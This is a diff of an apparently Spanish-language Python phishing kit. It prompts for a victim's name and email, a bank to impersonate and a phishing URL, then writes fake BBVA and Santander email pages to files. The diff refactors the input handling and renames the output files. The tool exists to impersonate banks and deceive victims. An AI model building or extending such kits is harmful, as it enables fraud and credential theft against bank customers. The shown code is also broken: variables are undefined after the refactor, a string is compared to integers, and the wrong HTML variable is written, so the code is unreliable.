@@ -2,15 +2,14 @@ import time
 import os
 import sys
 import smtplib
+from helper.helper import getPath,get_input_es
 
 def bank_es():
     #Información de la victima
-    userName = input("Introduce el nombre de tu victima-->")
-    bank = input("Introduce el banco que quieres suplantar-->")
-    url=("Introduce el url de phishing-->")
-    userEmail=("Introduce el email de la victima-->")
+    get_input_es()
     
     ##HTML que se enviara a la victima
+    bank = input("Introduce el banco que quieres suplantar-->")
     if bank==1:
         bbva_es(userName,userEmail,url)
     elif bank==2:
@@ -1169,7 +1168,7 @@ def bbva_es(userName,userEmail,url):
                       </div>
                     </html>
                    """.format(url,url))
-    fileNameHtml=userName+"Office.html"
+    fileNameHtml=userName+"BBVAS.html"
     htmlFile=open("./reportFolder/"+fileNameHtml,"w")
     htmlFile.write(officeHtml)
     htmlFile.close()
@@ -1182,7 +1181,7 @@ def santander_es(userName,userEmail,url):
     santanderHtml=("""
                    
                    """.format(currentDate,userEmail,userEmail,userEmail,userEmail,userEmail))
-    fileNameHtml=userName+"Office.html"
+    fileNameHtml=userName+"Santanders.html"
     htmlFile=open("./reportFolder/"+fileNameHtml,"w")
     htmlFile.write(officeHtml)
     htmlFile.close()
